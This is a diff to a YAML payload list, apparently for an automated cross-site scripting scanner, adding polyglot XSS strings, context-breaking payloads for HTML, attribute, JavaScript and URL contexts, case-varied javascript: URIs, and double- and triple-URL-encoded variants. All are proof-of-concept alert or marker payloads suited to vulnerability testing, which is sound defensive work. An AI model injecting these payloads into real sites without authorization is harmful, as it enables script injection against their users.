@@ -11,17 +11,47 @@ payloads:
     - '"><script>alert(1)</script>'
     - "javascript:alert(1)"
 
-  # Context-breaking polyglots (HTML, JS string, JS template literal,
-  # JS event handler, CSS expression)
+  # True polyglot payloads that work across href, src, data attrs,
+  # inline handlers, and script contexts without modification.
   polyglot:
-    - '"><svg/onload=alert(1)>'
-    - "';alert(1)//"
-    - '${alert(1)}'
-    - ' " onfocus=alert(1) autofocus= '
-    - 'expression(alert(1))'
+    - 'jaVasCript:/*-/*/`/\"'/**/(/ */oNcliCk=alert() )//%0D%0A%0D%0A</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e'
+    - '\"-alert(1)//'
+    - 'javascript:alert(1)//\"\'-alert(1)--> <script>alert(1)</script>'
+    - '\";alert(1)//\';alert(1)//--></SCRIPT>">\'><SCRIPT>alert(1)</SCRIPT>'
+    - 'javascript:/*--></title></style></textarea></script></noscript>--><svg/onload=alert(1)>'
+
+  # Context-breaking payloads
+  context:
+    html:
+      - '<img src=x onerror=alert(1)>'
+      - '<svg/onload=alert(1)>'
+      - '<script>alert(1)</script>'
+      - '<noscript><p title="</noscript><img src=x onerror=alert(1)>">'
+    attribute:
+      - '" onfocus=alert(1) autofocus= '
+      - "' onfocus=alert(1) autofocus= "
+      - '" autofocus onfocus=alert(1) x="'
+      - '" onmouseover=alert(1) '
+    javascript:
+      - "';alert(1)//"
+      - '</script><script>alert(1)</script>'
+      - "';alert(1);'"
+    url:
+      - "javascript:alert(1)"
+      - "javaScript:alert(1)"
+      - "JaVaScRiPt:alert(1)"
 
   # Payloads used specifically for DOM XSS verification
   dom:
     - '<img src=x onerror=window.__bbh_xss=1>'
     - '"><img src=x onerror=window.__bbh_xss=1>'
     - "javascript:window.__bbh_xss=1"
+
+  # Encoding chain payloads — double/triple URL-encoded variants
+  encoding_chains:
+    double_url:
+      - '%253Cscript%253Ealert(1)%253C/script%253E'
+      - '%2522%253E%253Cscript%253Ealert(1)%253C/script%253E'
+    triple_url:
+      - '%25253Cscript%25253Ealert(1)%25253C/script%25253E'
+      - '%252522%25253E%25253Cscript%25253Ealert(1)%25253C/script%25253E'
